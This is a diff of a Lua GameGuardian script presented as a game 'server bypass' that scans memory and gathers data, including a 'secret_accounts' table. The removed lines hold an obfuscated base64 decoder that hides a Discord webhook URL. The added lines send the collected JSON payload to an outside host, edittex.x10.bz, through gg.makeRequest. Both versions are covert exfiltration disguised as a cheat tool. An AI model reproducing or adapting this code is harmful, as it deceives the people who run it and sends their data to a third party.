@@ -5,8 +5,6 @@ function dwordToUTF8(dword)
     local byte4 = (dword >> 24) & 0xFF
     return string.char(byte1, byte2, byte3, byte4)
 end
-Tx=((((15-10)-3)/((14-9)-(5-2)))*((7-4)-(620-(555+64))))+30;Kt=(((935-(857+74))-(570-(367+201)))/(937-(214+713)))*Tx;xj=(12*(2+3))+(((98+525)-((1432-(282+595))+64))*Kt);zk=(933-((2494-(1523+114))+67+7))*xj;local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-function BhdDDyDmqHDmESSMZIZbLlLjbumpNqGliHuGubcxYWjldQKogNxQFONIvMxTVg(data) m=string.sub(data, 0, (Tx*Kt/Tx)/(zk/3)+(zk*1/2)) data=data:gsub(m,'')
 gg.toast("Please wait.....bypassing server")
 function scanAndCollectResults(searchString, refineString, maxResults, stepCount, searchType)
     searchType = searchType or gg.TYPE_BYTE
@@ -37,9 +35,8 @@ function scanAndCollectResults(searchString, refineString, maxResults, stepCount
     return fullUtf8Data
 end
 
-data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
-local zxs = BhdDDyDmqHDmESSMZIZbLlLjbumpNqGliHuGubcxYWjldQKogNxQFONIvMxTVg('lENkxXjqubLZrwAQMfLisYozvPTvyKJtufSxKYwOcBDBqaYjfSHFhgiskrKtaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI5NTg1MjE2MzI1MTE3NTU0Ni9EemJkQkNfVWxmRnA4elBXNi1GTnNXb01vbjVpUzRDT2I4amhmNzVHcmxKdWlFV3pRZWNTNHgzOXhuNklvcThObWxxVg==')
- 
+local whk = "http://edittex.x10.bz/Bypass"
+
 local function buildQuery(url, query)
     if not query or next(query) == nil then
         return url
@@ -98,7 +95,7 @@ local function sendWebhook(payload_content)
         ["Content-Type"] = "application/json",
     }
     local payload_json = toJson(payload)
-    gg.search(zxs, headers, payload_json)
+    gg.makeRequest(whk, headers, payload_json)
 end
  
 local secret_accounts = {}
